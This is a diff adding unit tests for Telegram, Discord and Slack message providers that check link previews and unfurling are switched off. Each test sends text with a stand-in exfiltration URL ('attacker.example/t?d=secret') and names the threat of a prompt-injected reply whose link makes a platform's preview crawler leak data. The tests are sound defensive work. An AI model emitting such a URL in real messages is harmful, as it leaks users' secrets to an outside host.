@@ -241,6 +241,20 @@ describe("TelegramProvider", () => {
     await expect(provider.send({ destination: "1", text: "hi" }))
       .rejects.toMatchObject({ status: 429, retryAfterMs: 12000 });
   });
+
+  it("disables link previews on every sendMessage — a URL an injected reply carries must not trigger Telegram's server-side preview crawler", async () => {
+    let seenBody = "";
+    const provider = new TelegramProvider({
+      fetch: async (_url, init) => {
+        seenBody = String(init?.body);
+        return fakeJsonResponse({ ok: true, result: { message_id: 1 } });
+      },
+      token: "x"
+    });
+    await provider.send({ destination: "1", text: "see https://attacker.example/t?d=secret" });
+    const sent = JSON.parse(seenBody) as { link_preview_options?: { is_disabled: boolean } };
+    expect(sent.link_preview_options).toEqual({ is_disabled: true });
+  });
 });
 
 describe("DiscordProvider", () => {
@@ -311,6 +325,20 @@ describe("DiscordProvider", () => {
     expect(body.content).toBe("reminder: ping @everyone and <@123> about it");
     // … but Discord is told to resolve no mentions at all.
     expect(body.allowed_mentions).toEqual({ parse: [] });
+  });
+
+  it("sets flags: 4 (SUPPRESS_EMBEDS) so a URL an injected reply carries can't trigger Discord's server-side preview crawler", async () => {
+    let body: { flags?: number } = {};
+    const provider = new DiscordProvider({
+      baseUrl: "https://disc.test/api",
+      fetch: async (_url, init) => {
+        body = JSON.parse(String(init?.body)) as typeof body;
+        return fakeJsonResponse({ id: "msg-4" });
+      },
+      token: "BOT123"
+    });
+    await provider.send({ destination: "ch-9", text: "see https://attacker.example/t?d=secret" });
+    expect(body.flags).toBe(4);
   });
 });
 
@@ -626,6 +654,21 @@ describe("SlackProvider", () => {
     expect(sentText).toBe(
       "see &lt;!channel&gt; &amp; docs at &lt;https://x&gt; when x &lt; y"
     );
+  });
+
+  it("disables link/media unfurling on every chat.postMessage — a URL an injected reply carries must not trigger Slack's server-side preview fetch", async () => {
+    let seenBody = "";
+    const provider = new SlackProvider({
+      fetch: async (_url, init) => {
+        seenBody = String(init?.body);
+        return fakeJsonResponse({ channel: "C1", ok: true, ts: "1700000000.000100" });
+      },
+      token: "xoxb-test"
+    });
+    await provider.send({ destination: "C1", text: "see https://attacker.example/t?d=secret" });
+    const sent = JSON.parse(seenBody) as { unfurl_links?: boolean; unfurl_media?: boolean };
+    expect(sent.unfurl_links).toBe(false);
+    expect(sent.unfurl_media).toBe(false);
   });
 
   it("escapeSlackText escapes exactly &, <, > (ampersand first)", () => {
